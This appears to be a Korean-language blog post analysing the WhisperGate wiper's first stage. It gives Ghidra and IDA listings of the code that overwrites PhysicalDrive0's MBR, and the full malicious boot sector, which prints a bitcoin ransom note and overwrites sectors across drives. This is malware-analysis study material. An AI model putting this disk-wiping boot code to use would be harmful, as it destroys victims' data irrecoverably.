---
layout: post
title:  "whispergate analysis"
date:   2022-02-08 22:25:36 +0530
categories: Mal Rev
---
## 0. 요약

stage1: 복구 불가능한 MBR overwrite

- 복구 불가능한 이유? 잘 모르겠음

## 1. 동적분석

~ing

## 2. 정적분석

### stage1

disassembler로 ghidra 사용하였다.

- Anti-Debugging
    
    ```cpp
    void FUN_004011b0(void)
    
    {
      code *pcVar1;
      int *piVar2;
      UINT uExitCode;
      
    	tls_callback_0(0,2);
      SetUnhandledExceptionFilter((LPTOP_LEVEL_EXCEPTION_FILTER)&LAB_00401000);
      FUN_00401800();
      FUN_00402010(DAT_00406024);
      FUN_00401460();
      pcVar1 = _iob_exref;
      if (DAT_00409020 != 0) {
        DAT_00406028 = DAT_00409020;
        _setmode(*(int *)(_iob_exref + 0x10),DAT_00409020);
        _setmode(*(int *)(pcVar1 + 0x30),DAT_00409020);
        _setmode(*(int *)(pcVar1 + 0x50),DAT_00409020);
      }
      piVar2 = (int *)__p__fmode();
      *piVar2 = DAT_00406028;
      FUN_00401e10();
      FUN_00401990();
      __p__environ();
      uExitCode = FUN_00403b60((char)DAT_00409004);
      _cexit();
                        /* WARNING: Subroutine does not return */
      ExitProcess(uExitCode);
    ```
    
    entry 함수에서 만나는 첫 함수를 타고 들어오면 있는 부분이다.
    
    ```cpp
    undefined4 tls_callback_0(undefined4 param_1,int param_2)
    
    {
      if (_DAT_00409064 != 2) {
        _DAT_00409064 = 2;
      }
      if ((param_2 != 2) && (param_2 == 1)) {
        FUN_00401c30(param_1,1);
      }
      return 1;
    }
    ```
    
    `tls_callback_0` 을 호출할 때 0과 1을 인자로 준다. 일단 뒤의 if 문에서는 절대 걸릴 일이 없다(param_2가 2니까).
    
    `_DAT_00409064` 가 2가 아닌지 확인을 하는데, 얘는 뭘까 일단 악성행위에 크게 중요한 부분은 아닌 것 같으니 넘어간다.
    
    `SetUnhandledExceptionFilter` 으로 검색해보면 anti debugging에 많이 사용되는 함수라고 나온다. 그래서 이 부분은 다 안티 디버깅 용으로 생각하고 넘어간다.
    
    실제 MBR 덮어쓰는 함수는 `FUN_00403b60((char)DAT_00409004)` 이다. (MBR overwirte 하고 나면 프로그램이 끝나는 것)
    
- main 로직 부분
    
    ```cpp
    undefined4 FUN_00403b60(undefined param_1)
    
    {
      int iVar1; 
      uint uVar2;
      HANDLE pvVar3;
      BOOL BVar4;
      int iVar5;
      undefined4 *puVar6;
      undefined4 *puVar7;
      undefined4 local_2020 [2050];
      undefined4 uStackY24;
      LPOVERLAPPED p_Stack4;
      
      uStackY24 = 0x403b7a;
      uVar2 = FUN_00401fe0(4);
      iVar1 = -uVar2;
      *(undefined4 *)((int)&uStackY24 + iVar1) = 0x403b8c;
      FUN_00401990();
      puVar6 = &DAT_00404020;
      puVar7 = local_2020;
      for (iVar5 = 0x800; iVar5 != 0; iVar5 = iVar5 + -1) {
        *puVar7 = *puVar6;
        puVar6 = puVar6 + 1;
        puVar7 = puVar7 + 1;
      }
      *(undefined4 *)(&param_1 + iVar1) = 0;
      *(undefined4 *)(&stack0x00000000 + iVar1) = 0;
      *(undefined4 *)((int)&p_Stack4 + iVar1) = 3;
      *(undefined4 *)(&stack0xfffffff8 + iVar1) = 0;
      *(undefined4 *)(&stack0xfffffff4 + iVar1) = 3;
      *(undefined4 *)(&stack0xfffffff0 + iVar1) = 0x10000000;
      *(wchar_t **)(&stack0xffffffec + iVar1) = L"\\\\.\\PhysicalDrive0";
      *(undefined4 *)((int)&uStackY24 + iVar1) = 0x403bcf;
      pvVar3 = CreateFileW(*(LPCWSTR *)(&stack0xffffffec + iVar1),*(DWORD *)(&stack0xfffffff0 + iVar1),
                           *(DWORD *)(&stack0xfffffff4 + iVar1),
                           *(LPSECURITY_ATTRIBUTES *)(&stack0xfffffff8 + iVar1),
                           *(DWORD *)((int)&p_Stack4 + iVar1),*(DWORD *)(&stack0x00000000 + iVar1),
                           *(HANDLE *)(&param_1 + iVar1));
      *(HANDLE *)(&stack0xffffffec + iVar1) = pvVar3;
      *(undefined4 *)((int)&p_Stack4 + iVar1) = 0;
      *(undefined4 *)(&stack0xfffffff8 + iVar1) = 0;
      *(undefined4 *)(&stack0xfffffff4 + iVar1) = 0x200;
      *(undefined4 **)(&stack0xfffffff0 + iVar1) = local_2020;
      *(undefined4 *)((int)&uStackY24 + iVar1) = 0x403bfe;
      WriteFile(*(HANDLE *)(&stack0xffffffec + iVar1),*(LPCVOID *)(&stack0xfffffff0 + iVar1),
                *(DWORD *)(&stack0xfffffff4 + iVar1),*(LPDWORD *)(&stack0xfffffff8 + iVar1),
                *(LPOVERLAPPED *)((int)&p_Stack4 + iVar1));
      *(HANDLE *)(&stack0xffffffec + iVar1) = pvVar3;
      *(undefined4 *)((int)&uStackY24 + iVar1) = 0x403c09;
      BVar4 = CloseHandle(*(HANDLE *)(&stack0xffffffec + iVar1));
      *(BOOL *)(&stack0xffffffec + iVar1) = BVar4;
      return 0;
    }
    ```
    
    `CreateFileW` 함수를 이용하여 MBR을 포함하고 있는 `PhysicalDrive0` 를 열어서 핸들을 얻어온다. `CreateFilew` 에서는 크게 볼건 없고 MBR을 포함하고 있는 `PhsycialDrive0` 의 핸들을 얻어오는 것이 중요하다. 
    
    ```cpp
    				00403b7a be 20 40        MOV        ESI,DAT_00404020                                 = C88C00EBh
                     40 00
            00403b7f 29 c4           SUB        ESP,EAX
            00403b81 8d bd e8        LEA        EDI=>local_2020,[EBP + 0xffffdfe8]
                     df ff ff
            00403b87 e8 04 de        CALL       FUN_00401990                                     undefined FUN_00401990(void)
                     ff ff
            00403b8c b9 00 08        MOV        ECX,0x800
                     00 00
            00403b91 f3 a5           MOVSD.REP  ES:EDI,ESI=>DAT_00404020      
                       = C88C00EBh
    				...
    				00403bcf 89 c6           MOV        ESI,EAX
            00403bd1 8d 85 e8        LEA        EAX=>local_2020,[EBP + 0xffffdfe8]
                     df ff ff
            00403bd7 83 ec 1c        SUB        ESP,0x1c
            00403bda 89 34 24        MOV        dword ptr [ESP],ESI // hFile
            00403bdd c7 44 24        MOV        dword ptr [ESP + 0x10],0x0 // lpOverlapped
                     10 00 00 
                     00 00
            00403be5 c7 44 24        MOV        dword ptr [ESP + 0xc],0x0 // lpNumberOfBytesWritten
                     0c 00 00 
                     00 00
            00403bed c7 44 24        MOV        dword ptr [ESP + 0x8],0x200 // nNumberOfBytesToWrite
                     08 00 02 
                     00 00
            00403bf5 89 44 24 04     MOV        dword ptr [ESP + 0x4],EAX // lpBuffer
            00403bf9 e8 aa fe        CALL       KERNEL32.DLL::WriteFile                          BOOL WriteFile(HANDLE hFile, LPC
                     ff ff
    ```
    
    `writeFile` 을 호출하기 위해 필요한 인자는 차례대로 hFile(write할 대상 핸들), lpBuffer(write 하려는 데이터), nNumberOfBytesToWrite(write 하려는 크기), lpNumberOfBytesWritten(실제 write 한 크기를 받을 주소), lpOverlapped(OVERLAPPED 구조체 주소)이다. (디컴파일 된 순서가 왜저런진 모르겠음)
    
    MBR에 쓰려는 데이터가 `EAX` 에 있는데 어떤 데이터가 있는지 확인하려면 위에서 봐야한다. 
    
    중간쯤에 있는 `movsd.rep` 라는 명령은 `esi` 가 가리키는 값을 `ecx` 만큼 `edi` 에 복사하는 명령어이다. 제일 처음을 보면 `esi` 에 `DAT_00404020` 값이 들어가는걸 확인할 수 있고 해당 데이터는
    
    ```cpp
    00404020 eb 00 8c        undefine
    				 c8 8e d8 
             be 88 7c ...
    004040a8 59 6f 75        ds         "Your hard drive has been corrupted.\r\nIn cas
             72 20 68 
             61 72 64 ...
    ```
    
    생략이 되었지만 MBR에 덮어쓸 데이터임을 알 수 있다. 해당 주소의 데이터 `0x200` 만큼 쓴다는걸 볼 수 있었다. MBR Boot code 만큼 덮어쓰는 것이므로 따로 확인하도록 하겠다.
    
- MBR boot code
    
    ```cpp
    BOOT_SECTOR:7C00 ; =============== S U B R O U T I N E =======================================
    BOOT_SECTOR:7C00
    BOOT_SECTOR:7C00
    BOOT_SECTOR:7C00                 public start
    BOOT_SECTOR:7C00 start           proc near
    BOOT_SECTOR:7C00
    BOOT_SECTOR:7C00 ; FUNCTION CHUNK AT BOOT_SECTOR:7C21 SIZE 00000051 BYTES
    BOOT_SECTOR:7C00
    BOOT_SECTOR:7C00                 jmp     short $+2
    BOOT_SECTOR:7C02 ; ---------------------------------------------------------------------------
    BOOT_SECTOR:7C02 loc_7C02:                               ; CODE XREF: start↑j
    BOOT_SECTOR:7C02                 mov     ax, cs 
    BOOT_SECTOR:7C04                 mov     ds, ax
    BOOT_SECTOR:7C06                 assume ds:BOOT_SECTOR
    BOOT_SECTOR:7C06                 mov     si, 7C88h // 0x7C88: 랜섬 노트
    BOOT_SECTOR:7C09                 call    $+3 // 여기서 바로 아래 실행함
    BOOT_SECTOR:7C0C                 push    ax
    BOOT_SECTOR:7C0D                 cld // 아래 쭉 이어서 실행
    BOOT_SECTOR:7C0E
    BOOT_SECTOR:7C0E loc_7C0E:                               ; CODE XREF: start+18↓j
    BOOT_SECTOR:7C0E                 mov     al, [si] // al = 랜섬 노트
    BOOT_SECTOR:7C10                 cmp     al, 0
    BOOT_SECTOR:7C12                 jz      short loc_7C1A
    BOOT_SECTOR:7C14                 call    sub_7C1C
    BOOT_SECTOR:7C17                 inc     si
    BOOT_SECTOR:7C18                 jmp     short loc_7C0E
    BOOT_SECTOR:7C1A ; ---------------------------------------------------------------------------
    BOOT_SECTOR:7C1A
    BOOT_SECTOR:7C1A loc_7C1A:                               ; CODE XREF: start+12↑j
    BOOT_SECTOR:7C1A                 jmp     short loc_7C21
    BOOT_SECTOR:7C1A start           endp
    BOOT_SECTOR:7C1A
    BOOT_SECTOR:7C1C
    BOOT_SECTOR:7C1C ; =============== S U B R O U T I N E =======================================
    BOOT_SECTOR:7C1C
    BOOT_SECTOR:7C1C
    BOOT_SECTOR:7C1C sub_7C1C        proc near               ; CODE XREF: start+14↑p
    BOOT_SECTOR:7C1C                 mov     ah, 0Eh
    BOOT_SECTOR:7C1E                 int     10h             ; - VIDEO - WRITE CHARACTER AND ADVANCE CURSOR (TTY WRITE)
    BOOT_SECTOR:7C1E                                         ; AL = character, BH = display page (alpha modes)
    BOOT_SECTOR:7C1E                                         ; BL = foreground color (graphics modes)
    BOOT_SECTOR:7C20                 retn
    BOOT_SECTOR:7C20 sub_7C1C        endp
    BOOT_SECTOR:7C20
    ```
    
    `si` 에 `0x7c88` 을 넣는데, 해당 오프셋은 랜섬 노트의 오프셋이다.
    
    ```cpp
    BOOT_SECTOR:7C88 aYourHardDriveH db 'Your hard drive has been corrupted.',0Dh,0Ah
    BOOT_SECTOR:7C88                 db 'In case you want to recover all hard drives',0Dh,0Ah
    BOOT_SECTOR:7C88                 db 'of your organization,',0Dh,0Ah
    BOOT_SECTOR:7C88                 db 'You should pay us  $10k via bitcoin wallet',0Dh,0Ah
    BOOT_SECTOR:7C88                 db '1AVNM68gj6PGPFcJuftKATa4WLnzg8fpfv and send message via',0Dh,0Ah
    BOOT_SECTOR:7C88                 db 'tox ID 8BEDC411012A33BA34F49130D0F186993C6A32DAD8976F6A5D82C1ED23'
    BOOT_SECTOR:7C88                 db '054C057ECED5496F65',0Dh,0Ah
    BOOT_SECTOR:7C88                 db 'with your organization name.',0Dh,0Ah
    BOOT_SECTOR:7C88                 db 'We will contact you to give further instructions.',0
    BOOT_SECTOR:7DFB                 db 3 dup(0), 55h, 0AAh
    ```
    
    ```cpp
    BOOT_SECTOR:7C21 ; ---------------------------------------------------------------------------
    BOOT_SECTOR:7C21 ; START OF FUNCTION CHUNK FOR start
    BOOT_SECTOR:7C21
    BOOT_SECTOR:7C21 loc_7C21:                               ; CODE XREF: start:loc_7C1A↑j
    BOOT_SECTOR:7C21                                         ; start+5B↓j ...
    BOOT_SECTOR:7C21                 mov     ax, cs
    BOOT_SECTOR:7C23                 mov     ds, ax
    BOOT_SECTOR:7C25                 mov     word_7C78, ax 
    BOOT_SECTOR:7C28                 mov     dword ptr word_7C76, 7C82h // 0x7c76: transfer buffer, 0x7c82: AAAAA
    BOOT_SECTOR:7C31                 mov     ah, 43h ; 'C'
    BOOT_SECTOR:7C33                 mov     al, 0
    BOOT_SECTOR:7C35                 mov     dl, byte_7C87 // drive index offset(처음엔 0)
    BOOT_SECTOR:7C39                 add     dl, 80h // drive index(0x80 : C)
    BOOT_SECTOR:7C3C                 mov     si, 7C72h // 0x7c72: DAP
    BOOT_SECTOR:7C3F                 int     13h             ; DISK - IBM/MS Extension - EXTENDED WRITE (DL - drive, AL - verify flag, DS:SI - disk address packet)
    BOOT_SECTOR:7C41                 jb      short loc_7C45 // CF = 1(fail)
    BOOT_SECTOR:7C43                 jnb     short loc_7C5D // CF = 0
    BOOT_SECTOR:7C45
    BOOT_SECTOR:7C45 loc_7C45:                               ; CODE XREF: start+41↑j
    BOOT_SECTOR:7C45                 inc     byte_7C87 // 드라이브 오프셋 +1
    BOOT_SECTOR:7C49                 mov     dword_7C7A, 1 
    BOOT_SECTOR:7C52                 mov     dword_7C7E, 0
    BOOT_SECTOR:7C5B                 jmp     short loc_7C21
    BOOT_SECTOR:7C5D ; ---------------------------------------------------------------------------
    BOOT_SECTOR:7C5D
    BOOT_SECTOR:7C5D loc_7C5D:                               ; CODE XREF: start+43↑j
    BOOT_SECTOR:7C5D                 add     dword_7C7A, 0C7h
    BOOT_SECTOR:7C66                 adc     dword_7C7E, 0
    BOOT_SECTOR:7C6F                 clc // CF = 0
    BOOT_SECTOR:7C70                 jmp     short loc_7C21
    BOOT_SECTOR:7C70 ; END OF FUNCTION CHUNK FOR start
    ```
    
    디스크에 읽기/쓰기를 하기 위해서는 DAP(Disk Address Packet) 구조체가 설정 되어야 한다.
    
    - DAP 구조
        
        해당 악성코드가 디스크 덮어 쓰기를 할 때 사용하는 DAP(Disk Address Packet) 구조는 아래와 같다.
        
        ```cpp
        BOOT_SECTOR:7C70 ; ---------------------------------------------------------------------------
        BOOT_SECTOR:7C72                 db 10h, 0, 1, 0
        BOOT_SECTOR:7C76 word_7C76       dw 0                    ; DATA XREF: start+28↑w
        BOOT_SECTOR:7C78 word_7C78       dw 0                    ; DATA XREF: start+25↑w
        BOOT_SECTOR:7C7A dword_7C7A      dd 1                    ; DATA XREF: start+49↑w
        BOOT_SECTOR:7C7A                                         ; start:loc_7C5D↑w
        BOOT_SECTOR:7C7E dword_7C7E      dd 0                    ; DATA XREF: start+52↑w
        BOOT_SECTOR:7C7E                                         ; start+66↑w
        ```
        
        ```
        Offset	Size	Description
         0	     1	  size of packet (16 bytes)
         1	     1	  always 0
         2     	 2	  number of sectors to transfer (max 127 on some BIOSes)
         4     	 4	  transfer buffer (16 bit segment:16 bit offset) (see note #1)
         8       4	  lower 32-bits of 48-bit starting LBA
        12     	 4	  upper 16-bits of 48-bit starting LBA
        ```
        
    
    (0x7C72) (offset 0 size 1) : size of packet (16 bytes) 
    
    (0x7C73) (offset 1 size 1) : Reserved (always 0)
    
    (0x7C74) (offset 2 size 2) : number of sectors to transfer
    
    (0x7C76) (offset 4 size 4) : transfer buffer (segment:offset)
    
    (0x7C7A) (offset 8 size 4) : lower 32-bits of 48-bit starting LBA
    
    (0x7C7E) (offset 12 size 4) : upper 16-bits of 48-bit starting LBA
    
    위에부터 보면 `0x7c76` 즉 DAP의 `transfer buffer` 에 랜섬노트 내용을 넣는다. `ah` 에는 0x43, `dl` 에는 처음엔 `0x7c87` 이 0이므로 0x80이 들어간다. 마지막으로 `si` 에 DAP 의 주소를 넣고 `int 0x13` 이 실행된다.
    
    `int 0x13` 은 디스크 엑세스 루틴을 제공한다. `ah` 값에 따라 명령이 달라지는데 0x43 은 디스크에 쓰기 권한을 준다. `dl` 은 드라이브를 나타내는데, 처음 드라이브 인덱스 오프셋은 0이며, `0x80` 을 더해준 값이 `dl` 이 된다. 아래의 두 가지 경우에 따라 다른 작업이 수행된다. `0x80` 은 C 드라이브를 나타낸다.
    
    - `loc_7C45`
        
        드라이브 오프셋을 1 증가시켜서 다시 `loc_7C21` 로 돌아가면 다음 드라이브를 확인하도록 한다.
        
        `dword_7C7A` 는 LBA 시작 주소의 하위 4byte, `dword_7C7E` 는 LBA 시작 주소의 상위 2byte이다. 하위 4byte에 1을 쓰고, 상위 2byte에는 0을 쓴다.
        
    - `loc_7C5D`
        
        LBA 시작 주소 하위 4byte에 +0xC7을 하고, 상위 2 byte에는 캐리 비트를 더해준 후에 CF를 0으로 만들어서 다시 `loc_7C21` 로 돌아간다.
        
        MBR은 LBA 0번이고, 처음 탐색한게 LBA 1번이니까 다음에는 LBA 200번에 데이터를 쓰게 된다.
        
        ![Untitled](WhisperGate%20%E1%84%87%E1%85%AE%E1%86%AB%E1%84%89%E1%85%A5%E1%86%A8%20c00d87749bc842ff95b90977af033d11/Untitled.png)
        
        ![Untitled](WhisperGate%20%E1%84%87%E1%85%AE%E1%86%AB%E1%84%89%E1%85%A5%E1%86%A8%20c00d87749bc842ff95b90977af033d11/Untitled%201.png)
        
        한 섹터는 0x200 바이트이고 +199 LBA에 다음 데이터를 쓰니까
        
        0x2B8A00 + (0x200 * 0xC7) = 0x2D1800에 데이터가 씌어진 것을 확인할 수 있음